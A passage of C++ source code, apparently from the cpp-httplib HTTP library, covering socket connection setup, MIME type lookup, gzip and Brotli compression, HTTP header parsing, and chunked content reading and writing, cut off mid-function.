inline void set_nonblocking(socket_t sock, bool nonblocking) {
#ifdef _WIN32
  auto flags = nonblocking ? 1UL : 0UL;
  ioctlsocket(sock, FIONBIO, &amp;flags);
#else
  auto flags = fcntl(sock, F_GETFL, 0);
  fcntl(sock, F_SETFL,
        nonblocking ? (flags | O_NONBLOCK) : (flags &amp; (~O_NONBLOCK)));
#endif
}

inline bool is_connection_error() {
#ifdef _WIN32
  return WSAGetLastError() != WSAEWOULDBLOCK;
#else
  return errno != EINPROGRESS;
#endif
}

inline bool bind_ip_address(socket_t sock, const std::string &amp;host) {
  struct addrinfo hints;
  struct addrinfo *result;

  memset(&amp;hints, 0, sizeof(struct addrinfo));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = 0;

  if (getaddrinfo(host.c_str(), "0", &amp;hints, &amp;result)) { return false; }
  auto se = detail::scope_exit([&amp;] { freeaddrinfo(result); });

  auto ret = false;
  for (auto rp = result; rp; rp = rp-&gt;ai_next) {
    const auto &amp;ai = *rp;
    if (!::bind(sock, ai.ai_addr, static_cast&lt;socklen_t&gt;(ai.ai_addrlen))) {
      ret = true;
      break;
    }
  }

  return ret;
}

#if !defined _WIN32 &amp;&amp; !defined ANDROID &amp;&amp; !defined _AIX &amp;&amp; !defined __MVS__
#define USE_IF2IP
#endif

#ifdef USE_IF2IP
inline std::string if2ip(int address_family, const std::string &amp;ifn) {
  struct ifaddrs *ifap;
  getifaddrs(&amp;ifap);
  auto se = detail::scope_exit([&amp;] { freeifaddrs(ifap); });

  std::string addr_candidate;
  for (auto ifa = ifap; ifa; ifa = ifa-&gt;ifa_next) {
    if (ifa-&gt;ifa_addr &amp;&amp; ifn == ifa-&gt;ifa_name &amp;&amp;
        (AF_UNSPEC == address_family ||
         ifa-&gt;ifa_addr-&gt;sa_family == address_family)) {
      if (ifa-&gt;ifa_addr-&gt;sa_family == AF_INET) {
        auto sa = reinterpret_cast&lt;struct sockaddr_in *&gt;(ifa-&gt;ifa_addr);
        char buf[INET_ADDRSTRLEN];
        if (inet_ntop(AF_INET, &amp;sa-&gt;sin_addr, buf, INET_ADDRSTRLEN)) {
          return std::string(buf, INET_ADDRSTRLEN);
        }
      } else if (ifa-&gt;ifa_addr-&gt;sa_family == AF_INET6) {
        auto sa = reinterpret_cast&lt;struct sockaddr_in6 *&gt;(ifa-&gt;ifa_addr);
        if (!IN6_IS_ADDR_LINKLOCAL(&amp;sa-&gt;sin6_addr)) {
          char buf[INET6_ADDRSTRLEN] = {};
          if (inet_ntop(AF_INET6, &amp;sa-&gt;sin6_addr, buf, INET6_ADDRSTRLEN)) {
            // equivalent to mac's IN6_IS_ADDR_UNIQUE_LOCAL
            auto s6_addr_head = sa-&gt;sin6_addr.s6_addr[0];
            if (s6_addr_head == 0xfc || s6_addr_head == 0xfd) {
              addr_candidate = std::string(buf, INET6_ADDRSTRLEN);
            } else {
              return std::string(buf, INET6_ADDRSTRLEN);
            }
          }
        }
      }
    }
  }
  return addr_candidate;
}
#endif

inline socket_t create_client_socket(
    const std::string &amp;host, const std::string &amp;ip, int port,
    int address_family, bool tcp_nodelay, bool ipv6_v6only,
    SocketOptions socket_options, time_t connection_timeout_sec,
    time_t connection_timeout_usec, time_t read_timeout_sec,
    time_t read_timeout_usec, time_t write_timeout_sec,
    time_t write_timeout_usec, const std::string &amp;intf, Error &amp;error) {
  auto sock = create_socket(
      host, ip, port, address_family, 0, tcp_nodelay, ipv6_v6only,
      std::move(socket_options),
      [&amp;](socket_t sock2, struct addrinfo &amp;ai, bool &amp;quit) -&gt; bool {
        if (!intf.empty()) {
#ifdef USE_IF2IP
          auto ip_from_if = if2ip(address_family, intf);
          if (ip_from_if.empty()) { ip_from_if = intf; }
          if (!bind_ip_address(sock2, ip_from_if)) {
            error = Error::BindIPAddress;
            return false;
          }
#endif
        }

        set_nonblocking(sock2, true);

        auto ret =
            ::connect(sock2, ai.ai_addr, static_cast&lt;socklen_t&gt;(ai.ai_addrlen));

        if (ret &lt; 0) {
          if (is_connection_error()) {
            error = Error::Connection;
            return false;
          }
          error = wait_until_socket_is_ready(sock2, connection_timeout_sec,
                                             connection_timeout_usec);
          if (error != Error::Success) {
            if (error == Error::ConnectionTimeout) { quit = true; }
            return false;
          }
        }

        set_nonblocking(sock2, false);
        set_socket_opt_time(sock2, SOL_SOCKET, SO_RCVTIMEO, read_timeout_sec,
                            read_timeout_usec);
        set_socket_opt_time(sock2, SOL_SOCKET, SO_SNDTIMEO, write_timeout_sec,
                            write_timeout_usec);

        error = Error::Success;
        return true;
      });

  if (sock != INVALID_SOCKET) {
    error = Error::Success;
  } else {
    if (error == Error::Success) { error = Error::Connection; }
  }

  return sock;
}

inline bool get_ip_and_port(const struct sockaddr_storage &amp;addr,
                            socklen_t addr_len, std::string &amp;ip, int &amp;port) {
  if (addr.ss_family == AF_INET) {
    port = ntohs(reinterpret_cast&lt;const struct sockaddr_in *&gt;(&amp;addr)-&gt;sin_port);
  } else if (addr.ss_family == AF_INET6) {
    port =
        ntohs(reinterpret_cast&lt;const struct sockaddr_in6 *&gt;(&amp;addr)-&gt;sin6_port);
  } else {
    return false;
  }

  std::array&lt;char, NI_MAXHOST&gt; ipstr{};
  if (getnameinfo(reinterpret_cast&lt;const struct sockaddr *&gt;(&amp;addr), addr_len,
                  ipstr.data(), static_cast&lt;socklen_t&gt;(ipstr.size()), nullptr,
                  0, NI_NUMERICHOST)) {
    return false;
  }

  ip = ipstr.data();
  return true;
}

inline void get_local_ip_and_port(socket_t sock, std::string &amp;ip, int &amp;port) {
  struct sockaddr_storage addr;
  socklen_t addr_len = sizeof(addr);
  if (!getsockname(sock, reinterpret_cast&lt;struct sockaddr *&gt;(&amp;addr),
                   &amp;addr_len)) {
    get_ip_and_port(addr, addr_len, ip, port);
  }
}

inline void get_remote_ip_and_port(socket_t sock, std::string &amp;ip, int &amp;port) {
  struct sockaddr_storage addr;
  socklen_t addr_len = sizeof(addr);

  if (!getpeername(sock, reinterpret_cast&lt;struct sockaddr *&gt;(&amp;addr),
                   &amp;addr_len)) {
#ifndef _WIN32
    if (addr.ss_family == AF_UNIX) {
#if defined(__linux__)
      struct ucred ucred;
      socklen_t len = sizeof(ucred);
      if (getsockopt(sock, SOL_SOCKET, SO_PEERCRED, &amp;ucred, &amp;len) == 0) {
        port = ucred.pid;
      }
#elif defined(SOL_LOCAL) &amp;&amp; defined(SO_PEERPID) // __APPLE__
      pid_t pid;
      socklen_t len = sizeof(pid);
      if (getsockopt(sock, SOL_LOCAL, SO_PEERPID, &amp;pid, &amp;len) == 0) {
        port = pid;
      }
#endif
      return;
    }
#endif
    get_ip_and_port(addr, addr_len, ip, port);
  }
}

inline constexpr unsigned int str2tag_core(const char *s, size_t l,
                                           unsigned int h) {
  return (l == 0)
             ? h
             : str2tag_core(
                   s + 1, l - 1,
                   // Unsets the 6 high bits of h, therefore no overflow happens
                   (((std::numeric_limits&lt;unsigned int&gt;::max)() &gt;&gt; 6) &amp;
                    h * 33) ^
                       static_cast&lt;unsigned char&gt;(*s));
}

inline unsigned int str2tag(const std::string &amp;s) {
  return str2tag_core(s.data(), s.size(), 0);
}

namespace udl {

inline constexpr unsigned int operator""_t(const char *s, size_t l) {
  return str2tag_core(s, l, 0);
}

} // namespace udl

inline std::string
find_content_type(const std::string &amp;path,
                  const std::map&lt;std::string, std::string&gt; &amp;user_data,
                  const std::string &amp;default_content_type) {
  auto ext = file_extension(path);

  auto it = user_data.find(ext);
  if (it != user_data.end()) { return it-&gt;second; }

  using udl::operator""_t;

  switch (str2tag(ext)) {
  default: return default_content_type;

  case "css"_t: return "text/css";
  case "csv"_t: return "text/csv";
  case "htm"_t:
  case "html"_t: return "text/html";
  case "js"_t:
  case "mjs"_t: return "text/javascript";
  case "txt"_t: return "text/plain";
  case "vtt"_t: return "text/vtt";

  case "apng"_t: return "image/apng";
  case "avif"_t: return "image/avif";
  case "bmp"_t: return "image/bmp";
  case "gif"_t: return "image/gif";
  case "png"_t: return "image/png";
  case "svg"_t: return "image/svg+xml";
  case "webp"_t: return "image/webp";
  case "ico"_t: return "image/x-icon";
  case "tif"_t: return "image/tiff";
  case "tiff"_t: return "image/tiff";
  case "jpg"_t:
  case "jpeg"_t: return "image/jpeg";

  case "mp4"_t: return "video/mp4";
  case "mpeg"_t: return "video/mpeg";
  case "webm"_t: return "video/webm";

  case "mp3"_t: return "audio/mp3";
  case "mpga"_t: return "audio/mpeg";
  case "weba"_t: return "audio/webm";
  case "wav"_t: return "audio/wave";

  case "otf"_t: return "font/otf";
  case "ttf"_t: return "font/ttf";
  case "woff"_t: return "font/woff";
  case "woff2"_t: return "font/woff2";

  case "7z"_t: return "application/x-7z-compressed";
  case "atom"_t: return "application/atom+xml";
  case "pdf"_t: return "application/pdf";
  case "json"_t: return "application/json";
  case "rss"_t: return "application/rss+xml";
  case "tar"_t: return "application/x-tar";
  case "xht"_t:
  case "xhtml"_t: return "application/xhtml+xml";
  case "xslt"_t: return "application/xslt+xml";
  case "xml"_t: return "application/xml";
  case "gz"_t: return "application/gzip";
  case "zip"_t: return "application/zip";
  case "wasm"_t: return "application/wasm";
  }
}

inline bool can_compress_content_type(const std::string &amp;content_type) {
  using udl::operator""_t;

  auto tag = str2tag(content_type);

  switch (tag) {
  case "image/svg+xml"_t:
  case "application/javascript"_t:
  case "application/json"_t:
  case "application/xml"_t:
  case "application/protobuf"_t:
  case "application/xhtml+xml"_t: return true;

  case "text/event-stream"_t: return false;

  default: return !content_type.rfind("text/", 0);
  }
}

inline EncodingType encoding_type(const Request &amp;req, const Response &amp;res) {
  auto ret =
      detail::can_compress_content_type(res.get_header_value("Content-Type"));
  if (!ret) { return EncodingType::None; }

  const auto &amp;s = req.get_header_value("Accept-Encoding");
  (void)(s);

#ifdef CPPHTTPLIB_BROTLI_SUPPORT
  // TODO: 'Accept-Encoding' has br, not br;q=0
  ret = s.find("br") != std::string::npos;
  if (ret) { return EncodingType::Brotli; }
#endif

#ifdef CPPHTTPLIB_ZLIB_SUPPORT
  // TODO: 'Accept-Encoding' has gzip, not gzip;q=0
  ret = s.find("gzip") != std::string::npos;
  if (ret) { return EncodingType::Gzip; }
#endif

  return EncodingType::None;
}

inline bool nocompressor::compress(const char *data, size_t data_length,
                                   bool /*last*/, Callback callback) {
  if (!data_length) { return true; }
  return callback(data, data_length);
}

#ifdef CPPHTTPLIB_ZLIB_SUPPORT
inline gzip_compressor::gzip_compressor() {
  std::memset(&amp;strm_, 0, sizeof(strm_));
  strm_.zalloc = Z_NULL;
  strm_.zfree = Z_NULL;
  strm_.opaque = Z_NULL;

  is_valid_ = deflateInit2(&amp;strm_, Z_DEFAULT_COMPRESSION, Z_DEFLATED, 31, 8,
                           Z_DEFAULT_STRATEGY) == Z_OK;
}

inline gzip_compressor::~gzip_compressor() { deflateEnd(&amp;strm_); }

inline bool gzip_compressor::compress(const char *data, size_t data_length,
                                      bool last, Callback callback) {
  assert(is_valid_);

  do {
    constexpr size_t max_avail_in =
        (std::numeric_limits&lt;decltype(strm_.avail_in)&gt;::max)();

    strm_.avail_in = static_cast&lt;decltype(strm_.avail_in)&gt;(
        (std::min)(data_length, max_avail_in));
    strm_.next_in = const_cast&lt;Bytef *&gt;(reinterpret_cast&lt;const Bytef *&gt;(data));

    data_length -= strm_.avail_in;
    data += strm_.avail_in;

    auto flush = (last &amp;&amp; data_length == 0) ? Z_FINISH : Z_NO_FLUSH;
    auto ret = Z_OK;

    std::array&lt;char, CPPHTTPLIB_COMPRESSION_BUFSIZ&gt; buff{};
    do {
      strm_.avail_out = static_cast&lt;uInt&gt;(buff.size());
      strm_.next_out = reinterpret_cast&lt;Bytef *&gt;(buff.data());

      ret = deflate(&amp;strm_, flush);
      if (ret == Z_STREAM_ERROR) { return false; }

      if (!callback(buff.data(), buff.size() - strm_.avail_out)) {
        return false;
      }
    } while (strm_.avail_out == 0);

    assert((flush == Z_FINISH &amp;&amp; ret == Z_STREAM_END) ||
           (flush == Z_NO_FLUSH &amp;&amp; ret == Z_OK));
    assert(strm_.avail_in == 0);
  } while (data_length &gt; 0);

  return true;
}

inline gzip_decompressor::gzip_decompressor() {
  std::memset(&amp;strm_, 0, sizeof(strm_));
  strm_.zalloc = Z_NULL;
  strm_.zfree = Z_NULL;
  strm_.opaque = Z_NULL;

  // 15 is the value of wbits, which should be at the maximum possible value
  // to ensure that any gzip stream can be decoded. The offset of 32 specifies
  // that the stream type should be automatically detected either gzip or
  // deflate.
  is_valid_ = inflateInit2(&amp;strm_, 32 + 15) == Z_OK;
}

inline gzip_decompressor::~gzip_decompressor() { inflateEnd(&amp;strm_); }

inline bool gzip_decompressor::is_valid() const { return is_valid_; }

inline bool gzip_decompressor::decompress(const char *data, size_t data_length,
                                          Callback callback) {
  assert(is_valid_);

  auto ret = Z_OK;

  do {
    constexpr size_t max_avail_in =
        (std::numeric_limits&lt;decltype(strm_.avail_in)&gt;::max)();

    strm_.avail_in = static_cast&lt;decltype(strm_.avail_in)&gt;(
        (std::min)(data_length, max_avail_in));
    strm_.next_in = const_cast&lt;Bytef *&gt;(reinterpret_cast&lt;const Bytef *&gt;(data));

    data_length -= strm_.avail_in;
    data += strm_.avail_in;

    std::array&lt;char, CPPHTTPLIB_COMPRESSION_BUFSIZ&gt; buff{};
    while (strm_.avail_in &gt; 0 &amp;&amp; ret == Z_OK) {
      strm_.avail_out = static_cast&lt;uInt&gt;(buff.size());
      strm_.next_out = reinterpret_cast&lt;Bytef *&gt;(buff.data());

      ret = inflate(&amp;strm_, Z_NO_FLUSH);

      assert(ret != Z_STREAM_ERROR);
      switch (ret) {
      case Z_NEED_DICT:
      case Z_DATA_ERROR:
      case Z_MEM_ERROR: inflateEnd(&amp;strm_); return false;
      }

      if (!callback(buff.data(), buff.size() - strm_.avail_out)) {
        return false;
      }
    }

    if (ret != Z_OK &amp;&amp; ret != Z_STREAM_END) { return false; }

  } while (data_length &gt; 0);

  return true;
}
#endif

#ifdef CPPHTTPLIB_BROTLI_SUPPORT
inline brotli_compressor::brotli_compressor() {
  state_ = BrotliEncoderCreateInstance(nullptr, nullptr, nullptr);
}

inline brotli_compressor::~brotli_compressor() {
  BrotliEncoderDestroyInstance(state_);
}

inline bool brotli_compressor::compress(const char *data, size_t data_length,
                                        bool last, Callback callback) {
  std::array&lt;uint8_t, CPPHTTPLIB_COMPRESSION_BUFSIZ&gt; buff{};

  auto operation = last ? BROTLI_OPERATION_FINISH : BROTLI_OPERATION_PROCESS;
  auto available_in = data_length;
  auto next_in = reinterpret_cast&lt;const uint8_t *&gt;(data);

  for (;;) {
    if (last) {
      if (BrotliEncoderIsFinished(state_)) { break; }
    } else {
      if (!available_in) { break; }
    }

    auto available_out = buff.size();
    auto next_out = buff.data();

    if (!BrotliEncoderCompressStream(state_, operation, &amp;available_in, &amp;next_in,
                                     &amp;available_out, &amp;next_out, nullptr)) {
      return false;
    }

    auto output_bytes = buff.size() - available_out;
    if (output_bytes) {
      callback(reinterpret_cast&lt;const char *&gt;(buff.data()), output_bytes);
    }
  }

  return true;
}

inline brotli_decompressor::brotli_decompressor() {
  decoder_s = BrotliDecoderCreateInstance(0, 0, 0);
  decoder_r = decoder_s ? BROTLI_DECODER_RESULT_NEEDS_MORE_INPUT
                        : BROTLI_DECODER_RESULT_ERROR;
}

inline brotli_decompressor::~brotli_decompressor() {
  if (decoder_s) { BrotliDecoderDestroyInstance(decoder_s); }
}

inline bool brotli_decompressor::is_valid() const { return decoder_s; }

inline bool brotli_decompressor::decompress(const char *data,
                                            size_t data_length,
                                            Callback callback) {
  if (decoder_r == BROTLI_DECODER_RESULT_SUCCESS ||
      decoder_r == BROTLI_DECODER_RESULT_ERROR) {
    return 0;
  }

  auto next_in = reinterpret_cast&lt;const uint8_t *&gt;(data);
  size_t avail_in = data_length;
  size_t total_out;

  decoder_r = BROTLI_DECODER_RESULT_NEEDS_MORE_OUTPUT;

  std::array&lt;char, CPPHTTPLIB_COMPRESSION_BUFSIZ&gt; buff{};
  while (decoder_r == BROTLI_DECODER_RESULT_NEEDS_MORE_OUTPUT) {
    char *next_out = buff.data();
    size_t avail_out = buff.size();

    decoder_r = BrotliDecoderDecompressStream(
        decoder_s, &amp;avail_in, &amp;next_in, &amp;avail_out,
        reinterpret_cast&lt;uint8_t **&gt;(&amp;next_out), &amp;total_out);

    if (decoder_r == BROTLI_DECODER_RESULT_ERROR) { return false; }

    if (!callback(buff.data(), buff.size() - avail_out)) { return false; }
  }

  return decoder_r == BROTLI_DECODER_RESULT_SUCCESS ||
         decoder_r == BROTLI_DECODER_RESULT_NEEDS_MORE_INPUT;
}
#endif

inline bool has_header(const Headers &amp;headers, const std::string &amp;key) {
  return headers.find(key) != headers.end();
}

inline const char *get_header_value(const Headers &amp;headers,
                                    const std::string &amp;key, const char *def,
                                    size_t id) {
  auto rng = headers.equal_range(key);
  auto it = rng.first;
  std::advance(it, static_cast&lt;ssize_t&gt;(id));
  if (it != rng.second) { return it-&gt;second.c_str(); }
  return def;
}

template &lt;typename T&gt;
inline bool parse_header(const char *beg, const char *end, T fn) {
  // Skip trailing spaces and tabs.
  while (beg &lt; end &amp;&amp; is_space_or_tab(end[-1])) {
    end--;
  }

  auto p = beg;
  while (p &lt; end &amp;&amp; *p != ':') {
    p++;
  }

  if (p == end) { return false; }

  auto key_end = p;

  if (*p++ != ':') { return false; }

  while (p &lt; end &amp;&amp; is_space_or_tab(*p)) {
    p++;
  }

  if (p &lt;= end) {
    auto key_len = key_end - beg;
    if (!key_len) { return false; }

    auto key = std::string(beg, key_end);
    // auto val = (case_ignore::equal(key, "Location") ||
    //             case_ignore::equal(key, "Referer"))
    //                ? std::string(p, end)
    //                : decode_url(std::string(p, end), false);
    auto val = std::string(p, end);

    if (!detail::fields::is_field_value(val)) { return false; }

    if (case_ignore::equal(key, "Location") ||
        case_ignore::equal(key, "Referer")) {
      fn(key, val);
    } else {
      fn(key, decode_url(val, false));
    }

    return true;
  }

  return false;
}

inline bool read_headers(Stream &amp;strm, Headers &amp;headers) {
  const auto bufsiz = 2048;
  char buf[bufsiz];
  stream_line_reader line_reader(strm, buf, bufsiz);

  for (;;) {
    if (!line_reader.getline()) { return false; }

    // Check if the line ends with CRLF.
    auto line_terminator_len = 2;
    if (line_reader.end_with_crlf()) {
      // Blank line indicates end of headers.
      if (line_reader.size() == 2) { break; }
    } else {
#ifdef CPPHTTPLIB_ALLOW_LF_AS_LINE_TERMINATOR
      // Blank line indicates end of headers.
      if (line_reader.size() == 1) { break; }
      line_terminator_len = 1;
#else
      continue; // Skip invalid line.
#endif
    }

    if (line_reader.size() &gt; CPPHTTPLIB_HEADER_MAX_LENGTH) { return false; }

    // Exclude line terminator
    auto end = line_reader.ptr() + line_reader.size() - line_terminator_len;

    if (!parse_header(line_reader.ptr(), end,
                      [&amp;](const std::string &amp;key, const std::string &amp;val) {
                        headers.emplace(key, val);
                      })) {
      return false;
    }
  }

  return true;
}

inline bool read_content_with_length(Stream &amp;strm, uint64_t len,
                                     Progress progress,
                                     ContentReceiverWithProgress out) {
  char buf[CPPHTTPLIB_RECV_BUFSIZ];

  uint64_t r = 0;
  while (r &lt; len) {
    auto read_len = static_cast&lt;size_t&gt;(len - r);
    auto n = strm.read(buf, (std::min)(read_len, CPPHTTPLIB_RECV_BUFSIZ));
    if (n &lt;= 0) { return false; }

    if (!out(buf, static_cast&lt;size_t&gt;(n), r, len)) { return false; }
    r += static_cast&lt;uint64_t&gt;(n);

    if (progress) {
      if (!progress(r, len)) { return false; }
    }
  }

  return true;
}

inline void skip_content_with_length(Stream &amp;strm, uint64_t len) {
  char buf[CPPHTTPLIB_RECV_BUFSIZ];
  uint64_t r = 0;
  while (r &lt; len) {
    auto read_len = static_cast&lt;size_t&gt;(len - r);
    auto n = strm.read(buf, (std::min)(read_len, CPPHTTPLIB_RECV_BUFSIZ));
    if (n &lt;= 0) { return; }
    r += static_cast&lt;uint64_t&gt;(n);
  }
}

inline bool read_content_without_length(Stream &amp;strm,
                                        ContentReceiverWithProgress out) {
  char buf[CPPHTTPLIB_RECV_BUFSIZ];
  uint64_t r = 0;
  for (;;) {
    auto n = strm.read(buf, CPPHTTPLIB_RECV_BUFSIZ);
    if (n &lt;= 0) { return false; }

    if (!out(buf, static_cast&lt;size_t&gt;(n), r, 0)) { return false; }
    r += static_cast&lt;uint64_t&gt;(n);
  }

  return true;
}

template &lt;typename T&gt;
inline bool read_content_chunked(Stream &amp;strm, T &amp;x,
                                 ContentReceiverWithProgress out) {
  const auto bufsiz = 16;
  char buf[bufsiz];

  stream_line_reader line_reader(strm, buf, bufsiz);

  if (!line_reader.getline()) { return false; }

  unsigned long chunk_len;
  while (true) {
    char *end_ptr;

    chunk_len = std::strtoul(line_reader.ptr(), &amp;end_ptr, 16);

    if (end_ptr == line_reader.ptr()) { return false; }
    if (chunk_len == ULONG_MAX) { return false; }

    if (chunk_len == 0) { break; }

    if (!read_content_with_length(strm, chunk_len, nullptr, out)) {
      return false;
    }

    if (!line_reader.getline()) { return false; }

    if (strcmp(line_reader.ptr(), "\r\n") != 0) { return false; }

    if (!line_reader.getline()) { return false; }
  }

  assert(chunk_len == 0);

  // NOTE: In RFC 9112, '7.1 Chunked Transfer Coding' mentiones "The chunked
  // transfer coding is complete when a chunk with a chunk-size of zero is
  // received, possibly followed by a trailer section, and finally terminated by
  // an empty line". https://www.rfc-editor.org/rfc/rfc9112.html#section-7.1
  //
  // In '7.1.3. Decoding Chunked', however, the pseudo-code in the section
  // does't care for the existence of the final CRLF. In other words, it seems
  // to be ok whether the final CRLF exists or not in the chunked data.
  // https://www.rfc-editor.org/rfc/rfc9112.html#section-7.1.3
  //
  // According to the reference code in RFC 9112, cpp-htpplib now allows
  // chuncked transfer coding data without the final CRLF.
  if (!line_reader.getline()) { return true; }

  while (strcmp(line_reader.ptr(), "\r\n") != 0) {
    if (line_reader.size() &gt; CPPHTTPLIB_HEADER_MAX_LENGTH) { return false; }

    // Exclude line terminator
    constexpr auto line_terminator_len = 2;
    auto end = line_reader.ptr() + line_reader.size() - line_terminator_len;

    parse_header(line_reader.ptr(), end,
                 [&amp;](const std::string &amp;key, const std::string &amp;val) {
                   x.headers.emplace(key, val);
                 });

    if (!line_reader.getline()) { return false; }
  }

  return true;
}

inline bool is_chunked_transfer_encoding(const Headers &amp;headers) {
  return case_ignore::equal(
      get_header_value(headers, "Transfer-Encoding", "", 0), "chunked");
}

template &lt;typename T, typename U&gt;
bool prepare_content_receiver(T &amp;x, int &amp;status,
                              ContentReceiverWithProgress receiver,
                              bool decompress, U callback) {
  if (decompress) {
    std::string encoding = x.get_header_value("Content-Encoding");
    std::unique_ptr&lt;decompressor&gt; decompressor;

    if (encoding == "gzip" || encoding == "deflate") {
#ifdef CPPHTTPLIB_ZLIB_SUPPORT
      decompressor = detail::make_unique&lt;gzip_decompressor&gt;();
#else
      status = StatusCode::UnsupportedMediaType_415;
      return false;
#endif
    } else if (encoding.find("br") != std::string::npos) {
#ifdef CPPHTTPLIB_BROTLI_SUPPORT
      decompressor = detail::make_unique&lt;brotli_decompressor&gt;();
#else
      status = StatusCode::UnsupportedMediaType_415;
      return false;
#endif
    }

    if (decompressor) {
      if (decompressor-&gt;is_valid()) {
        ContentReceiverWithProgress out = [&amp;](const char *buf, size_t n,
                                              uint64_t off, uint64_t len) {
          return decompressor-&gt;decompress(buf, n,
                                          [&amp;](const char *buf2, size_t n2) {
                                            return receiver(buf2, n2, off, len);
                                          });
        };
        return callback(std::move(out));
      } else {
        status = StatusCode::InternalServerError_500;
        return false;
      }
    }
  }

  ContentReceiverWithProgress out = [&amp;](const char *buf, size_t n, uint64_t off,
                                        uint64_t len) {
    return receiver(buf, n, off, len);
  };
  return callback(std::move(out));
}

template &lt;typename T&gt;
bool read_content(Stream &amp;strm, T &amp;x, size_t payload_max_length, int &amp;status,
                  Progress progress, ContentReceiverWithProgress receiver,
                  bool decompress) {
  return prepare_content_receiver(
      x, status, std::move(receiver), decompress,
      [&amp;](const ContentReceiverWithProgress &amp;out) {
        auto ret = true;
        auto exceed_payload_max_length = false;

        if (is_chunked_transfer_encoding(x.headers)) {
          ret = read_content_chunked(strm, x, out);
        } else if (!has_header(x.headers, "Content-Length")) {
          ret = read_content_without_length(strm, out);
        } else {
          auto is_invalid_value = false;
          auto len = get_header_value_u64(
              x.headers, "Content-Length",
              (std::numeric_limits&lt;uint64_t&gt;::max)(), 0, is_invalid_value);

          if (is_invalid_value) {
            ret = false;
          } else if (len &gt; payload_max_length) {
            exceed_payload_max_length = true;
            skip_content_with_length(strm, len);
            ret = false;
          } else if (len &gt; 0) {
            ret = read_content_with_length(strm, len, std::move(progress), out);
          }
        }

        if (!ret) {
          status = exceed_payload_max_length ? StatusCode::PayloadTooLarge_413
                                             : StatusCode::BadRequest_400;
        }
        return ret;
      });
}

inline ssize_t write_request_line(Stream &amp;strm, const std::string &amp;method,
                                  const std::string &amp;path) {
  std::string s = method;
  s += " ";
  s += path;
  s += " HTTP/1.1\r\n";
  return strm.write(s.data(), s.size());
}

inline ssize_t write_response_line(Stream &amp;strm, int status) {
  std::string s = "HTTP/1.1 ";
  s += std::to_string(status);
  s += " ";
  s += httplib::status_message(status);
  s += "\r\n";
  return strm.write(s.data(), s.size());
}

inline ssize_t write_headers(Stream &amp;strm, const Headers &amp;headers) {
  ssize_t write_len = 0;
  for (const auto &amp;x : headers) {
    std::string s;
    s = x.first;
    s += ": ";
    s += x.second;
    s += "\r\n";

    auto len = strm.write(s.data(), s.size());
    if (len &lt; 0) { return len; }
    write_len += len;
  }
  auto len = strm.write("\r\n");
  if (len &lt; 0) { return len; }
  write_len += len;
  return write_len;
}

inline bool write_data(Stream &amp;strm, const char *d, size_t l) {
  size_t offset = 0;
  while (offset &lt; l) {
    auto length = strm.write(d + offset, l - offset);
    if (length &lt; 0) { return false; }
    offset += static_cast&lt;size_t&gt;(length);
  }
  return true;
}

template &lt;typename T&gt;
inline bool write_content(Stream &amp;strm, const ContentProvider &amp;content_provider,
                          size_t offset, size_t length, T is_shutting_down,
                          Error &amp;error) {
  size_t end_offset = offset + length;
  auto ok = true;
  DataSink data_sink;

  data_sink.write = [&amp;](const char *d, size_t l) -&gt; bool {
    if (ok) {
      if (strm.is_writable() &amp;&amp; write_data(strm, d, l)) {
        offset += l;
      } else {
        ok = false;
      }
    }
    return ok;
  };

  data_sink.is_writable = [&amp;]() -&gt; bool { return strm.is_writable(); };

  while (offset &lt; end_offset &amp;&amp; !is_shutting_down()) {
    if (!strm.is_writable()) {
      error = Error::Write;
      return false;
    } else if (!content_provider(offset, end_offset - offset, data_sink)) {
      error = Error::Canceled;
      return false;
    } else if (!ok) {
      error = Error::Write;
      return false;
    }
  }

  error = Error::Success;
  return true;
}

template &lt;typename T&gt;
inline bool write_content(Stream &amp;strm, const ContentProvider &amp;content_provider,
                          size_t offset, size_t length,
                          const T &amp;is_shutting_down) {
  auto error = Error::Success;
  return write_content(strm, content_provider, offset, length, is_shutting_down,
                       error);
}

template &lt;typename T&gt;
inline bool
write_content_without_length(Stream &amp;strm,
                             const ContentProvider &amp;content_provider,
                             const T &amp;is_shutting_down) {
  size_t offset = 0;
  auto data_available = true;
  auto ok = true;
  DataSink data_sink;

  data_sink.write = [&amp;](const char *d, size_t l) -&gt; bool {
    if (ok) {
      offset += l;
      if (!strm.is_writable() || !write_data(strm, d, l)) { ok = false; }
    }
    return ok;
  };

  data_sink.is_writable = [&amp;]() -&gt; bool { return strm.is_writable(); };

  data_sink.done = [&amp;](void) { data_available = false; };

  while (data_available &amp;&amp; !is_shutting_down()) {
    if (!strm.is_writable()) {
      return false;
    } else if (!content_provider(offset, 0, data_sink)) {
      return false;
    } else if (!ok) {
      return false;
    }
  }
  return true;
}

template &lt;typename T, typename U&gt;
inline bool
write_content_chunked(Stream &amp;strm, const ContentProvider &amp;content_provider,
                      const T &amp;is_shutting_down, U &amp;compressor, Error &amp;error) {
  size_t offset = 0;
  auto data_available = true;
  auto ok = true;
  DataSink data_sink;

  data_sink.write = [&amp;](const char *d, size_t l) -&gt; bool {
    if (ok) {
      data_available = l &gt; 0;
      offset += l;

      std::string payload;
      if (compressor.compress(d, l, false,
                              [&amp;](const char *data, size_t data_len) {
                                payload.append(data, data_len);
                                return true;
                              })) {
        if (!payload.empty()) {
          // Emit chunked response header and footer for each chunk
          auto chunk =
              from_i_to_hex(payload.size()) + "\r\n" + payload + "\r\n";
          if (!strm.is_writable() ||
              !write_data(strm, chunk.data(), chunk.size())) {
            ok = false;
          }
        }
      } else {
        ok = false;
      }
    }
    return ok;
  };

  data_sink.is_writable = [&amp;]() -&gt; bool { return strm.is_writable(); };

  auto done_with_trailer = [&amp;](const Headers *trailer) {
    if (!ok) { return; }

    data_available = false;

    std::string payload;
    if (!compressor.compress(nullptr, 0, true,
                             [&amp;](const char *data, size_t data_len) {
                               payload.append(data, data_len);
                               return true;
                             })) {
      ok = false;
      return;
    }

    if (!payload.empty()) {
      // Emit chunked response header and footer for each chunk
      auto chunk = from_i_to_hex(payload.size()) + "\r\n" + payload + "\r\n";
      if (!strm.is_writable() ||
          !write_data(strm, chunk.data(), chunk.size())) {
        ok = false;
        return;
      }
    }

    static const std::string done_marker("0\r\n");
    if (!write_data(strm, done_marker.data(), done_marker.size())) {
      ok = false;
    }

    // Trailer
    if (trailer) {
      for (const auto &amp;kv : *trailer) {
        std::string field_line = kv.first + ": " + kv.second + "\r\n";
        if (!write_data(strm, field_line.data(), field_line.size())) {
          ok = false;
        }
      }
    }

    static const std::string crlf("\r\n");
    if (!write_data(strm, crlf.data(), crlf.size())) { ok = false; }
  };

